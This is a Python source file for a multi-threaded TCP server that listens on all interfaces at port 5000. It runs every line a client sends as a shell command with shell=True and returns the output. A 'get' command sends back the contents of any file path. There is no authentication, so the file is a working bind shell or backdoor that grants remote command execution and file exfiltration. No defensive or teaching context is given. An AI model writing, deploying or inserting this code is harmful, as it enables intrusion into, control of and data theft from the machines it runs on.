import socket
import threading
import subprocess

SERVER_HOST = '0.0.0.0'
SERVER_PORT = 5000
BUFFER_SIZE = 4096

def handle_client(client_socket, client_address):
    print(f"[+] Connection from {client_address[0]}:{client_address[1]} established.")
    try:
        while True:
            command = client_socket.recv(BUFFER_SIZE)
            if not command:
                break
            command = command.decode().strip()
            if not command:
                continue

            print(f"[COMMAND] {client_address[0]}: {command}")

            if command.startswith("get "):
                filepath = command[4:].strip()
                try:
                    with open(filepath, "rb") as f:
                        file_data = f.read()
                    client_socket.sendall(b"[FILE_DATA]" + file_data)
                    print(f"[+] Sent file '{filepath}' ({len(file_data)} bytes)")
                except Exception as e:
                    error_message = f"[-] Failed to read file: {e}\n"
                    client_socket.sendall(error_message.encode())
            else:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    client_socket.sendall(output)
                except subprocess.CalledProcessError as e:
                    client_socket.sendall(e.output)
    except Exception as e:
        print(f"[-] Error handling client {client_address[0]}: {e}")
    finally:
        client_socket.close()
        print(f"[-] Connection closed from {client_address[0]}")

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(5)
    print(f"[+] Server listening on {SERVER_HOST}:{SERVER_PORT}")

    try:
        while True:
            client_sock, client_addr = server_socket.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_sock, client_addr))
            client_thread.daemon = True
            client_thread.start()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down...")
    finally:
        server_socket.close()

if __name__ == "__main__":
    main()
